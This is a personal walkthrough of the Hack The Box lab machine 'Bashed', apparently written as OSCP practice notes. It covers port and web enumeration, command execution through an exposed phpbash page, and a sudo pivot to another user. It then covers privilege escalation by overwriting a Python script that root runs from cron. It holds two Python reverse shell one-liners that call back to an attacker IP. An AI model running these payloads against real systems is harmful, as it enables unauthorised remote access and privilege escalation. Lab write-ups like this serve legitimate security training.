## Intro

tags: #linux #OSCPpath #WebApp #cronjob # easy

------
## Logging

- logs only current terminal
- type `exit` or press `Ctrl+D` to stop and save the file
- - to stop and save the file. You can replay it later using [scriptreplay](https://www.keuperict.nl/posts/security/2019/11/20/logging-terminal-session/)
```shell
script -t=timing.log bashed.log
```
ctrl+d should show this output:
```shell
exit
Script done.
```
now replay it as video on your terminal
```shell
scriptreplay -t timing.log bashed.log
```
if sth strange happens and did not happen to execute ctrl+d then
```shell
echo $SCRIPT
```
- If it outputs a path to a file (like `/home/kali/typescript`), **you are still recording**.
- If it returns a blank line, **you are not recording**.
- even if i close terminal the output will be saved

-> clean log for reporting, its now plaintext as shown on terminal
```shell
sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" bashed.log > bashed_report.txt
```

----
# Reconnaissance


```shell
source basher target1 10.129.65.227 [IP]
source basher host1 bashed.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-06 05:55 -0400
Nmap scan report for 10.129.65.227
Host is up (0.050s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.08 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p80 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-06 05:56 -0400
Nmap scan report for bashed.htb (10.129.65.227)
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4, Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   47.81 ms 10.10.14.1
2   47.99 ms bashed.htb (10.129.65.227)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found

## WebApp

`http://bashed.htb/`
![](MediaFiles/Pasted%20image%2020260906125718.png)
this one is also interesting
`http://bashed.htb/single.html`
![](MediaFiles/Pasted%20image%2020260906125811.png)



### Directories

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$target1/FUZZ
```

```shell

uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 48ms]
dev                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 53ms]
php                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 47ms]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 46ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 1797ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 3803ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 4809ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 47ms]
:: Progress: [29999/29999] :: Job [1/1] :: 829 req/sec :: Duration: [0:00:39] :: Errors: 1 ::

```


![](MediaFiles/Pasted%20image%2020260906130109.png)

### Subdomains

```shell
gobuster dns --domain $target1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
nothing

### Vhosts enumeration

```shell
curl -s http://$target1 | wc -c
7743
```

```shell
gobuster vhost -u http://$target1 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 7743 -t 50
```
no subdomains found


### Browsing

#### phpbash

![](MediaFiles/Pasted%20image%2020260906131444.png)
found where the php bash runs, and it seems it lets us execute commands

-----
# Foothold

lets execute some commands
```shell
www-data@bashed
:/# cat /etc/passwd | grep "/bin/bash"

root:x:0:0:root:/root:/bin/bash
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
```

found user flag
```shell
www-data@bashed
:/# cd home

www-data@bashed
:/home# ls

arrexel
scriptmanager
www-data@bashed
:/home# cd arrexel

www-data@bashed
:/home/arrexel# ls

user.txt
www-data@bashed
:/home/arrexel# cat user.txt

fb90e199c3279fc24c127f9605511904
```

### Filesystem enum

found also a php file
```php
www-data@bashed
:/var/www/html/php# cat sendMail.php


include_once (dirname(dirname(__FILE__)) . '/config.php');

//Initial response is NULL
$response = null;

//Initialize appropriate action and return as HTML response
if (isset($_POST["action"])) {
$action = $_POST["action"];

switch ($action) {
case "SendMessage": {
if (isset($_POST["name"]) && isset($_POST["email"]) && isset($_POST["subject"]) && isset($_POST["message"]) && !empty($_POST["name"]) && !empty($_POST["email"]) && !empty($_POST["subject"]) && !empty($_POST["message"])) {

$message = $_POST["message"];
$message .= "

";

$response = (SendEmail($message, $_POST["subject"], $_POST["email"], $email)) ? 'Message Sent' : "Sending Message Failed";
} else {
$response = "Sending Message Failed";
}
}
break;
default: {
$response = "Invalid action is set! Action is: " . $action;
}
}
}


if (isset($response) && !empty($response) && !is_null($response)) {
echo '{"ResponseData":' . json_encode($response) . '}';
}

function SendEmail($message, $subject, $from, $to) {
$isSent = false;
// Content-type header
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
// Additional headers
// $headers .= 'To: ' . $to . "\r\n";
$headers .= 'From: ' . $from . "\r\n";

mail($to, $subject, $message, $headers);
if (mail) {
$isSent = true;
}
return $isSent;
}

?>
```

### Reverse shell

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.247",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## Shell as www-data

```shell
└─$ nc -lvnp 3333                                                                                                                                                       
listening on [any] 3333 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.65.227] 57152
$ whoami
whoami
www-data
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
### sudo -l

```shell
└─$ nc -lvnp 3333                                                                                                                                                       
listening on [any] 3333 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.65.227] 57152
$ whoami
whoami
www-data
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/var/www/html/dev$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

### Custom binary

```shell
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager
sudo -u scriptmanager
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
            [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-u user] file ...
```
## Shell as scriptmanager

lets just use the `-u` option to login as scriptmanager
```shell
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager /bin/bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/var/www/html/dev$ whoami
whoami
scriptmanager
```

----
# Privesc
## Filesystem enumeration

```shell
scriptmanager@bashed:/$ ls -la
ls -la
total 92
drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
-rw-------   1 root          root            212 Jun 14  2022 .bash_history
drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
drwxr-xr-x  19 root          root           4140 Sep  6 02:50 dev
drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 178 root          root              0 Sep  6 02:50 proc
drwx------   3 root          root           4096 Sep  6 02:50 root
drwxr-xr-x  18 root          root            520 Sep  6 02:50 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Sep  6 02:50 sys
drwxrwxrwt  10 root          root           4096 Sep  6 03:33 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```
found non default folder on root dir `scripts`
### Abnormal script found
```shell
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
testing 123!scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Sep  6 03:33 test.txt
```

### Edit writable script
interesting, it seems we can run test.py, but test.txt wont open since its root's:
```shell
scriptmanager@bashed:/scripts$ python test.py
python test.py
Traceback (most recent call last):
  File "test.py", line 1, in <module>
    f = open("test.txt", "w")
IOError: [Errno 13] Permission denied: 'test.txt'
```
we can write the file as scriptmanager tho, lets do it
```
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.247",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /scripts/test.py
```
We see that a process is being executed on a regular interval that is executed any file ending in .py. Because we are the owner of test.py I will simply echo out the contents and replace with a python reverse shell
```shell
echo  > test.py
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.247",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' > test.py
```
then run `python test.py` but got shell as scriptmanager again! WHY?

### it runs via cronjob

IMPORTANT -->  since test.py doesn’t have a #! at the start, it seems that whatever is running this (maybe a cron?) is calling python.

## Shell as root

so if you just wait some time then u get the root shell as the cronjob is running
```shell
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.65.227] 39220
# whoami
whoami
root
# pwd
pwd
/scripts
# cd
cd
# pwd
pwd
/root
# cat root.txt
cat root.txt
57b21d7f6a4754c354316a465db22a8d
# 
```
## Extras

now that we are root, we can view the cronjob:
```shell
# crontab -l
crontab -l
* * * * * cd /scripts; for f in *.py; do python "$f"; done
# 
```
here our suspicion was verified

`ctrl+d` to stop terminal logging 

----
